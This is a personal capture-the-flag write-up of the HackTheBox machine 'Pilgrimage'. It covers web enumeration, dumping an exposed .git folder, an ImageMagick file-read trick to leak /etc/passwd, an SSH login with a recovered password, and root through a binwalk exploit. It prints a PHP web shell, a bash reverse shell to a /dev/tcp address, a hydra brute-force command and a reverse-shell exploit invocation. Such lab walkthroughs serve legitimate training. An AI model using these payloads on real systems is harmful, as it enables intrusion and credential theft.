cuWe have two ports opened the 22 and 80



What is the SYSTEM ? LINUX ? WINDOWS ??


The ttl is 63 so we can guess that this is a linux machine
```
┌──(cds㉿kali)-[~/Documents/htb/Prilgrimage/nmap]
└─$ ping -c 1 10.10.11.219
PING 10.10.11.219 (10.10.11.219) 56(84) bytes of data.
64 bytes from 10.10.11.219: icmp_seq=1 ttl=63 time=200 ms

--- 10.10.11.219 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 199.636/199.636/199.636/0.000 ms

```

Details of the ports
```
┌──(cds㉿kali)-[~/Documents/htb/Prilgrimage/nmap]
└─$ sudo nmap -p 22,80 -sVC 10.10.11.219 -oN targeted            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 21:46 EDT
Nmap scan report for 10.10.11.219
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

I have to edit the /etc/hosts

```
10.10.11.219   pilgrimage.htb 
```


Lets see what web what it got for us 


```
http://pilgrimage.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]
```

Launchpad OpenSSH 8.4p1 Debian 5+deb11u1

```
[Sid](https://launchpad.net/debian/sid)
```

Wappalyzer told me that these are the technologies working on this machine

![[Screenshot_2023-09-11_21_58_13.png]]

This site is for store images... but im thinking that we maybe can put some file .php and try to get inside the machine with a reverse shell, with a php payload. The classic :
```
<?php system($_GET['cmd']); ?>
```

I made a  file called "test.php" and when I try to put inside of the input , the browser doesn't recognizes the extension.php ... so i think a png o jpg it would be possible.


So it ony accept jpg png or other and this kind of apps reduces the pixels of the images

GOOGLE SAYS THIS:
```
When you shrink an image, **the image's resolution is reduced**. This means that the number of pixels in the image is decrease.
```

I will log inside to see what more I can see .. but at the first eye I thing the question is here on this input.

When you register on the site and make the upload of an image this makes you an url for the image and you can see it 

![[Screenshot_2023-09-11_22_11_18.png]]

So.. when I was trying to put test inside of a jpg file it doesnt work.. for example on the test.jpg put the payload of php .. the message is "Image shrink failed"

I found this article, maybe it will help me 

https://onestepcode.com/injecting-php-code-to-jpg/


Interesting this written on wikipedia about Exif  (Exchangeable image file format)
https://en.wikipedia.org/wiki/Exif

Since the Exif tag contains metadata about the photo, it can pose a privacy problem. For example, a photo taken with a [GPS](https://en.wikipedia.org/wiki/GPS "GPS")-enabled camera can reveal the exact location and time it was taken, and the unique ID number of the device - this is all done by default - often without the user's knowledge. Many users may be unaware that their photos are tagged by default in this manner, or that specialist software may be required to remove the Exif tag before publishing. For example, a [whistleblower](https://en.wikipedia.org/wiki/Whistleblower "Whistleblower"), journalist or [political dissident](https://en.wikipedia.org/wiki/Political_dissident "Political dissident") relying on the protection of anonymity to allow them to report [malfeasance](https://en.wikipedia.org/wiki/Misfeasance "Misfeasance") by a corporate entity, criminal, or government may therefore find their safety compromised by this default data collection.


We must use  this tool jhead to modify the metadata of the file

https://github.com/Matthias-Wandel/jhead/releases/tag/3.08


This is another sciript on python 

https://github.com/dlegs/php-jpeg-injector
```
`python3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT_JPEG]`

	e.g. `python3 gd-jpeg.py cat.jpeg '<?php system($_GET["cmd"]);?>' infected_cat.jpeg`
```

I will try first the script with python.

While i was using this exploit i recive 
```
┌──(cds㉿kali)-[~/Documents/htb/Prilgrimage/exploits]
└─$ python3  gd-jpeg.py screenshot.jpeg '<?php system($_GET["cmd"]);?>' infected_cat.jpeg 
[ ] Searching for magic number...
[+] Found magic number.
[ ] Injecting payload...
[+] Payload written.

```

ok... i put the image and when i do this  I cannot recive the output .. but at least I do not recive a 404 error.
```
http://pilgrimage.htb/shrunk/6500b9e55e399.jpeg?cmd=%27whoami%27 
```
What happens if i put 

```
?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.45/443 0>%261"
```
And then i listen with netcat ?

maybe this will work

So... no this doesnt work.

Im searching if i can see where the files are, but im really lost at this point.. I dont know what to do

```
python3 /home/cds/dirsearch/dirsearch.py -u http://10.10.11.219 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f
```


When i clicked on the url, I recive a error .. so maybe the file is no more on the website...
```
http://pilgrimage.htb/shrunk/6500b9e55e399.jpeg
```


NO !! THIS DOESN'T WORK...

?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.45/443 0>%261"


I didnt found no other subdirectory ... so the problem is .. how did I make this payload work?..

I found some explanations on this article, very interesting 
https://medium.com/@igordata/php-running-jpg-as-php-or-how-to-prevent-execution-of-user-uploaded-files-6ff021897389

But I wont make it work....

Im using nmap again to see if i can find something, maybe on the last scanner i dont get all the information (I'm lying I discover that on a walktrough that I dont find a .git folder)

```
┌──(cds㉿kali)-[~/Documents/htb/Prilgrimage/nmap]
└─$ nmap -p 80 -sT -sV -sC 10.10.11.219 -oN dale
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 16:54 EDT
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set


```
I know that there is a tool that dumps the info of some project,  I have used it before.

if I go to http://pilgrimage.htb/.git/   I just recive a error 403 "forbidden" message

So, to see this project frist we need to download the tool git dumper

```
 svn checkout https://github.com/internetwache/GitTools/trunk/Dumper
```

Now we execute the git dumper , we are telling that we need to drop all the content to the  folder /project
```
./gitdumper.sh http://10.10.11.219/.git/ ../project
```

Now we will be monitoring all the proces with the command:

```
watch -n 1 'echo `du -hc project | tail -n 1`'
```


Every minute we will have info about what is happening on our project
![[Screenshot_2023-09-12_17_17_07.png]]

Que hace du (??) Disk usage.....

****du**** command is used for estimating file and directory space usage. The name `du` stands for “disk usage”. It provides information about the storage consumption of files and directories.

Que hace -hc (??)

I dont know.. but this is the output that we get
```
──(cds㉿kali)-[~/Documents/htb/Prilgrimage/content]
└─$ du -hc project
4.0K    project/.git/refs/remotes/origin
8.0K    project/.git/refs/remotes
4.0K    project/.git/refs/wip/wtree/refs/heads
8.0K    project/.git/refs/wip/wtree/refs
12K     project/.git/refs/wip/wtree
4.0K    project/.git/refs/wip/index/refs/heads
8.0K    project/.git/refs/wip/index/refs
12K     project/.git/refs/wip/index
28K     project/.git/refs/wip
8.0K    project/.git/refs/heads
48K     project/.git/refs
8.0K    project/.git/info
4.0K    project/.git/logs/refs/remotes/origin
8.0K    project/.git/logs/refs/remotes
8.0K    project/.git/logs/refs/heads
20K     project/.git/logs/refs
28K     project/.git/logs
8.0K    project/.git/objects/8e
40K     project/.git/objects/cd
44K     project/.git/objects/c4
8.0K    project/.git/objects/9e
28K     project/.git/objects/8a
152K    project/.git/objects/47
12K     project/.git/objects/76
4.0K    project/.git/objects/00
8.0K    project/.git/objects/ca
8.0K    project/.git/objects/26
8.0K    project/.git/objects/98
68K     project/.git/objects/29
52K     project/.git/objects/11
20K     project/.git/objects/c2
8.0K    project/.git/objects/46
8.0K    project/.git/objects/f2
8.0K    project/.git/objects/81
8.0K    project/.git/objects/e9
26M     project/.git/objects/f1
8.0K    project/.git/objects/93
40K     project/.git/objects/96
252K    project/.git/objects/88
36K     project/.git/objects/1f
32K     project/.git/objects/c3
12K     project/.git/objects/49
148K    project/.git/objects/5f
104K    project/.git/objects/fd
32K     project/.git/objects/2b
8.0K    project/.git/objects/23
52K     project/.git/objects/a5
4.0K    project/.git/objects/info
120K    project/.git/objects/50
8.0K    project/.git/objects/36
8.0K    project/.git/objects/8f
108K    project/.git/objects/06
32K     project/.git/objects/54
8.0K    project/.git/objects/2f
8.0K    project/.git/objects/e1
8.0K    project/.git/objects/ff
8.0K    project/.git/objects/a7
4.0K    project/.git/objects/41
8.0K    project/.git/objects/dc
16K     project/.git/objects/b6
8.0K    project/.git/objects/b2
8.0K    project/.git/objects/6c
84K     project/.git/objects/fb
24K     project/.git/objects/fa
8.0K    project/.git/objects/f3
128K    project/.git/objects/b4
4.0K    project/.git/objects/65
28M     project/.git/objects
28M     project/.git
28M     project
28M     total

```
Lets proceed with the next step with another tool (extractor) we give him the folder "project" and it rebuilds the project 


YOu must download the extractor.sh from github, then indicate that you want to extract from the folder project and dump it all to the full project folder
```
./extractor.sh project fullproject
```
![[Screenshot_2023-09-12_17_33_31.png]]
Watching on the machine I can see that the pictures that  I was uploading are on the folder /tmp/

```
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```

ok , im really lost .. wtf i have to do ..
There is a binary called "magick"

```
┌──(cds㉿kali)-[~/…/Prilgrimage/content/fullproject/0-e1a40beebc7035212efdcb15476f9c994e3634a7]
└─$ ./magick -usage
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}

All options are performed in a strict 'as you see them' order
You must read-in images before you can operate on them.

Magick Script files can use any of the following forms...
     #!/path/to/magick -script
or
     #!/bin/sh
     :; exec magick -script "$0" "$@"; exit 10
     # Magick script from here...
or
     #!/usr/bin/env  magick-script
The latter two forms do not require the path to the command hard coded.
Note: "magick-script" needs to be linked to the "magick" command.

For more information on usage, options, examples, and techniques
see the ImageMagick website at    https://imagemagick.org
                                                                
```

Here is an interesting information

```
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 
```

This is the vulnerability 

https://www.hackplayers.com/2023/02/imagemagick-la-vulnerabilidad-oculta.html


So I did it this: 
```
┌──(cds㉿kali)-[~/Documents/htb/Prilgrimage/exploits]
└─$ pngcrush -text a "profile" "/etc/passwd" pngegg.png                                                    
  Recompressing IDAT chunks in pngegg.png to pngout.png
   Total length of data found in critical chunks            =     49124
   Best pngcrush method        =   6 (ws 15 fm 6 zl 9 zs 0) =     52445
CPU time decode 0.050937, encode 0.530020, other 0.003649, total 0.589868 sec
```

When I upload this file , I would be able to read the /etc/passwd file. And then I guess I would be able to get inside of the machine via ssh.

I downloaded the pictrure from the website, and i have this hexadecimal info on the picture, so when I  use 

```
identify -verbose file.png
```

I was able to see the /etc/passwd 

```
1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

```

With this python script I will be able to read it :

```
python3 -c 'print(bytes.fromhex("texto_en_hexadecimal").decode("utf-8"))'
```
Now, this doesnt say nothing
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

emily:x:1000:1000:emily,,,:/home/emily:/bin/bash

Emily is a valid user of the system


Here I find some info of the passwords of linux
https://www.ibm.com/docs/es/aix/7.3?topic=files-etcpasswd-file


Maybe , here  I can find something, on  /etc/nginx/.htpasswd. 

I cant see nothing :(

Even I tryed if maybe the 4000 port of ngix is open and no... obviously .. the port 4000 is not open.

The only thing that I'm thinking right now is start a ssh bruteforce attack , with the user "emily" ... maybe im wrong.. 


```
hydra -l emily -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.219 
```


Ok, I was searching over there, and I can see that there is another file that I would be watched, and I didnt know that it exists. it is the file called "/var/db/pilgrimage" I will have this more present... 

The output is a lot of content... i will not put it here because its too verbose.


FInally I found something that looks like a credential.


-emilyabigchonkyboi123
emily abigchonkyboi123


I wasnt able to connect via ssh .. with the clasical ssh emili@$IP   

I'm trying now with sshpass

I cant... wtf ???


IM SO STUPID !!! THE USER IS EMILY... THE PASSWORD ABIGCHONKYBOY123


So I finally get the user flag.

I did not find cappabilities with getcap -r 2>/dev/null
I did not find no perm with sudo -l
I did not find nothing on the groups with id

Now im using pspy, if I dont see nothing I will use Linpeas

This is an interesting process runing on the machine

![[Screenshot_2023-09-13_15_38_51.png]]

Waiting a couple of minutes I found that there is a process executing  something.

![[Screenshot_2023-09-13_15_46_07.png]]

Im very interested on this one : 

```
2023/09/14 05:39:01 CMD: UID=0     PID=4683   | find /proc/840/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;


2023/09/14 05:39:01 CMD: UID=0     PID=4684   | find /proc/839/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; 


2023/09/14 05:39:01 CMD: UID=0     PID=4685   | find /proc/699/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;

```

this is the process that is founding 

```
2023/09/14 05:36:17 CMD: UID=33    PID=840    | php-fpm: pool www


2023/09/14 05:36:17 CMD: UID=33    PID=839    | php-fpm: pool www  


2023/09/14 05:36:17 CMD: UID=0     PID=699    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)  

```

This is the $PATH:
```
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
If i create a different "touch" file ? that permites me execute a shell

ok... i create this 
I put on the path my own touch file.. and when the process that is automatically working and execute the touch, it will execute my touch file that has this
system "chmod u+s"


```
nano touch
emily@pilgrimage:/tmp$ echo PATH=tmp:$PATH
PATH=tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

```

Hmmm I think this is not workin xD


When I  upload a image this happens :

![[Screenshot_2023-09-13_16_30_21.png]]

Root executes malwarescan.sh


Im searching something ...

```
emily@pilgrimage:~$ ls -la /lib/systemd/systemd-udevd | grep system-udevd
emily@pilgrimage:~$ ls -la /lib/systemd/ | grep systemd-udevd
lrwxrwxrwx  1 root root      12 Dec 22  2022 systemd-udevd -> /bin/udevadm
```

this binary systemd-uvedev, i have permissions maybe if I change the content of this maybe this can be a possible path to the priviledge scalation

```
emily@pilgrimage:~$ echo 'system "chmod u+s"' >> /lib/systemd/systemd-udevd
bash: /lib/systemd/systemd-udevd: Permission denied

```

So I have permissions on this
```
lrwxrwxrwx  1 root root      12 Dec 22  2022 systemd-udevd -> /bin/udevadm
```

not on the bin udevadm

```
emily@pilgrimage:~$ ls -la /bin/ | grep udevadm
-rwxr-xr-x  1 root root     1049696 Dec 22  2022 udevadm

```

When I use nano /lib/systemd/systemd-udevd it is imposible to write.


OK ... MAY FKN GAD !!!!

```
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
 filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
 binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
      if [[ "$binout" == *"$banned"* ]]; then
        /usr/bin/rm "$filename"
        break
      fi
 done
done

```

Seems to be like this binary called "inotifywait" is working executing the malware detection, apparently this is the way to exploit the machine, this have some kind of vulnerability 


I have execution permissions
```
emily@pilgrimage:~$ ls -la /usr/bin/ | grep inotifywait
-rwxr-xr-x  1 root root       30880 May 26  2020 inotifywait

```


https://www.thegeekdiary.com/inotifywait-command-examples-in-linux/

I was thinking that if I use this

```
inotifywait --event access /tmp/new_file &&  /bin/bash
```


so .. when I use 

```
cat /tmp/new_file 
```

I guess I can have a bash ... or put something like "system chmod u+s" or bash -p.. or something
SO ... when I put cat i have priviledges.. but this is not working :((((((



FKN SHT...
```
inotifywait --event access /tmp/new_file && touch /home/emily/test

```

FKN SHT...

I was thinking that if I make this command the file will be owned by the root... and NOOOO !!!
```
-rw-r--r-- 1 emily emily       0 Sep 15 11:32 test
```

Lets inspect a little  on this binary

```
/usr/local/bin/binwalk
```
This is the version
```
Binwalk v2.3.2
```
Here we have some explanations
https://www.exploit-db.com/exploits/51249


and another one 

https://github.com/adhikara13/CVE-2022-4510-WalkingPath


Ok i have the exploit on the victim machine via python server... now i must use it 


```
python exploit_generator.py reverse input.png 192.168.0.100 4444
```

This gives you a png file ... and then I putted it on the shrunk folder... 

and finally im root.

This wasn't easy for me and I have to search some hints... but I did my best !!!

